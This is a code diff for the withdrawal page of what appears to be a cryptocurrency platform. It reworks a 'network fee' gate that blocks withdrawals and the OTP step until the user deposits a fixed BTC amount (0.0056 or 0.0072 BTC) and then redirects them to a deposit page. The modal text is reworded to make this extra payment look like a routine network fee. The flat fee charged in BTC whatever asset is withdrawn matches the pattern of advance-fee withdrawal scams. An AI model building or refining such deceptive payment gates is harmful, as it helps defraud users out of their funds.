@@ -3634,17 +3634,17 @@
       <div class="fee-modal-icon">
         <i class="fas fa-gas-pump"></i>
       </div>
-      <h2>Additional Fee Required</h2>
-      <p class="fee-subtitle">Additional funds are required before this withdrawal can continue. Please add the amount shown below to your <span id="fee-modal-asset-name">asset</span> balance.</p>
+      <h2>Network Fee Required</h2>
+      <p class="fee-subtitle">This withdrawal requires a network fee. Please deposit the required fee before continuing.</p>
 
       <div class="fee-details" id="fee-details">
         <div class="fee-row">
-          <span class="fee-label">Amount Required</span>
+          <span class="fee-label">Required Network Fee</span>
           <span class="fee-value" id="fee-modal-gas-fee">0.00000000 ASSET</span>
         </div>
         <div class="fee-divider"></div>
         <div class="fee-total-row">
-          <span>Additional Amount</span>
+          <span>Fee Still Required</span>
           <span class="fee-total-value" id="fee-modal-shortfall">0.00000000 ASSET</span>
         </div>
       </div>
@@ -3657,7 +3657,7 @@
           Cancel
         </button>
       </div>
-      <p class="fee-extra-info">Add the additional amount to your account, then return to continue your withdrawal.</p>
+      <p class="fee-extra-info">Deposit the required network fee, then return to continue your withdrawal.</p>
     </div>
   </div>
 
@@ -4836,31 +4836,70 @@
     // =============================================
     // WITHDRAWAL FEE GATE
     // =============================================
-    // The network-fee requirement is denominated by the fee-paying asset.
-    // The browser checks the actual fee-paying asset balance loaded from
-    // /api/users/assets. It does NOT use the withdrawal amount balance as a
-    // proxy and does NOT call a non-existent fee-check endpoint.
-    async function verifyFeeAvailabilityBeforeOtp(usdAmount) {
-      const asset = AppState.selectedAsset || topAssets[0];
-      const btcFee = Number(usdAmount) < 10000 ? 0.0056 : 0.0072;
-      const token = getAuthToken();
+    // The network fee is paid from the MAIN wallet's fee-paying BTC balance.
+    // The selected withdrawal asset and its withdrawal balance are never used
+    // as a substitute for the fee check.
+    function getMainFeeBalanceFromAsset(asset) {
+      if (!asset) return NaN;
 
+      const candidates = [
+        asset.mainBalance,
+        asset.mainWalletBalance,
+        asset.main_balance,
+        asset.main_wallet_balance,
+        asset.wallets?.main?.balance,
+        asset.balances?.main,
+        asset.walletBalances?.main,
+        asset.wallets?.MAIN?.balance,
+        asset.balances?.MAIN,
+        asset.walletBalances?.MAIN
+      ];
+
+      for (const value of candidates) {
+        const n = Number(value);
+        if (Number.isFinite(n)) return n;
+      }
+
+      // In this application /api/users/assets represents the user's MAIN
+      // crypto ledger. Only use the asset balance when that API is the source
+      // of the main-wallet crypto balances; never use a total/combined wallet
+      // balance for the fee gate.
+      const explicitWallet = String(
+        asset.wallet || asset.walletType || asset.balanceSource || asset.source || ''
+      ).toLowerCase();
+      if (!explicitWallet || explicitWallet === 'main' || explicitWallet === 'main wallet') {
+        const n = Number(asset.balance);
+        return Number.isFinite(n) ? n : NaN;
+      }
+
+      return NaN;
+    }
+
+    function showFeeCheckError() {
+      AppState.feeConfirmed = false;
+      AppState.feeRequirement = null;
+      showNotification('error', 'Fee Check Unavailable', 'We could not confirm the required network fee. Please try again.');
+    }
+
+    async function checkInsufficientFeeAndShowModal(requiredFee) {
+      const fee = Number(requiredFee);
+      const token = getAuthToken();
       AppState.feeConfirmed = false;
       AppState.feeRequirement = null;
 
-      if (!token) return false;
+      if (!token || !Number.isFinite(fee) || fee <= 0) {
+        showFeeCheckError();
+        return false;
+      }
 
       try {
-        // Read the same live asset ledger used by the application. The fee
-        // check is performed against the actual fee-paying BTC balance,
-        // never against the selected withdrawal balance or USD wallet value.
         const response = await fetch(`${API_BASE_URL}/api/users/assets`, {
           headers: { 'Authorization': `Bearer ${token}` },
           cache: 'no-store'
         });
 
         if (!response.ok) {
-          console.error('Unable to refresh fee-paying asset balance:', response.status);
+          showFeeCheckError();
           return false;
         }
 
@@ -4872,74 +4911,59 @@
         const liveAssets = rawAssets.map(normalizeCryptoAsset);
         AppState.cryptoAssets = liveAssets;
 
-        const btcAsset = liveAssets.find(a =>
-          String(a.symbol || '').toLowerCase() === 'btc'
-        );
-        const feeWalletBalance = Number(btcAsset?.totalAmount);
+        const btcAsset = liveAssets.find(a => String(a.symbol || '').toLowerCase() === 'btc');
+        const mainFeeBalance = getMainFeeBalanceFromAsset(btcAsset);
 
-        if (!Number.isFinite(feeWalletBalance)) {
-          console.error('Fee-paying BTC balance is missing from the live asset response.');
+        if (!Number.isFinite(mainFeeBalance)) {
+          // Never fall back to a total wallet balance. If the MAIN fee balance
+          // cannot be identified, OTP must remain blocked.
+          showFeeCheckError();
           return false;
         }
 
-        if (feeWalletBalance + Number.EPSILON < btcFee) {
-          const shortfall = btcFee - feeWalletBalance;
-          AppState.feeRequirement = {
-            feeAsset: 'btc',
-            required: btcFee,
-            balance: feeWalletBalance,
-            shortfall,
-            withdrawalAsset: String(asset.symbol || '').toLowerCase()
-          };
-          showFeeModal(btcFee, shortfall, asset);
+        const shortfall = Math.max(0, fee - mainFeeBalance);
+        AppState.feeRequirement = {
+          feeAsset: 'btc',
+          required: fee,
+          mainBalance: mainFeeBalance,
+          shortfall,
+          withdrawalAsset: String((AppState.selectedAsset || {}).symbol || '').toLowerCase()
+        };
+
+        if (shortfall > Number.EPSILON) {
+          showFeeModal(fee, shortfall);
           return false;
         }
 
         AppState.feeConfirmed = true;
-        AppState.feeRequirement = {
-          feeAsset: 'btc',
-          required: btcFee,
-          balance: feeWalletBalance,
-          shortfall: 0,
-          withdrawalAsset: String(asset.symbol || '').toLowerCase()
-        };
         return true;
       } catch (error) {
         console.error('Fee balance check failed:', error);
+        showFeeCheckError();
         return false;
       }
     }
 
-    function showFeeModal(requiredFee, shortfall, asset) {
+    async function verifyFeeAvailabilityBeforeOtp(usdAmount) {
+      const fee = Number(usdAmount) < 10000 ? 0.0056 : 0.0072;
+      return await checkInsufficientFeeAndShowModal(fee);
+    }
+
+    function showFeeModal(requiredFee, shortfall) {
       const feeAsset = topAssets.find(a => String(a.symbol).toLowerCase() === 'btc') ||
         { symbol: 'btc', name: 'Bitcoin' };
       const symbol = String(feeAsset.symbol).toUpperCase();
       const price = Number(AppState.assetPrices?.btc) ||
         Number(AppState.cryptoAssets.find(a => String(a.symbol || '').toLowerCase() === 'btc')?.currentPrice) || 0;
+      const remainingFee = Math.max(0, Number(shortfall) || 0);
 
-      const nameEl = document.getElementById('fee-modal-asset-name');
+      const assetNameEl = document.getElementById('fee-modal-asset-name');
       const gasEl = document.getElementById('fee-modal-gas-fee');
       const shortfallEl = document.getElementById('fee-modal-shortfall');
 
-      if (nameEl) nameEl.textContent = feeAsset.name || symbol;
+      if (assetNameEl) assetNameEl.textContent = feeAsset.name || symbol;
       if (gasEl) gasEl.textContent = `${formatNumberWithCommas(Number(requiredFee), 8)} ${symbol}${price > 0 ? ` (≈ ${formatUSD(Number(requiredFee) * price)})` : ''}`;
-
-      // Never label the fee-paying wallet balance as "Available Balance".
-      // The user only needs to know what additional fee amount is required.
-      if (shortfallEl) {
-        shortfallEl.textContent = `${formatNumberWithCommas(Math.max(0, Number(shortfall) || 0), 8)} ${symbol}${price > 0 ? ` (≈ ${formatUSD(Math.max(0, Number(shortfall) || 0) * price)})` : ''}`;
-      }
-
-      try {
-        sessionStorage.setItem('withdrawalFeeAsset', JSON.stringify({
-          symbol: feeAsset.symbol,
-          name: feeAsset.name,
-          network: feeAsset.network,
-          requiredFee: Number(requiredFee),
-          shortfall: Math.max(0, Number(shortfall) || 0),
-          withdrawalAsset: asset?.symbol || ''
-        }));
-      } catch (_) {}
+      if (shortfallEl) shortfallEl.textContent = `${formatNumberWithCommas(remainingFee, 8)} ${symbol}${price > 0 ? ` (≈ ${formatUSD(remainingFee * price)})` : ''}`;
 
       const overlay = document.getElementById('fee-modal-overlay');
       if (overlay) overlay.classList.add('active');
@@ -4957,10 +4981,18 @@
       window.location.href = 'deposit.html';
     }
 
+    // Re-check the MAIN fee balance immediately before any OTP request.
     async function confirmFeeBeforeOtp() {
       const pending = AppState.pendingWithdrawalData;
       if (!pending || pending.method !== 'crypto') return true;
-      return await verifyFeeAvailabilityBeforeOtp(pending.usdAmount);
+
+      const confirmed = await checkInsufficientFeeAndShowModal(pending.gasFee);
+      if (!confirmed) {
+        AppState.feeConfirmed = false;
+        return false;
+      }
+      AppState.feeConfirmed = true;
+      return true;
     }
 
     // =============================================
@@ -5062,9 +5094,7 @@
       if (purpose === 'withdrawal') {
         const pending = AppState.pendingWithdrawalData;
         if (pending && pending.method === 'crypto') {
-          if (!AppState.feeConfirmed || !(Number(AppState.feeRequirement?.required) > 0)) {
-            return null;
-          }
+          if (!(await confirmFeeBeforeOtp())) return null;
         }
       }
 
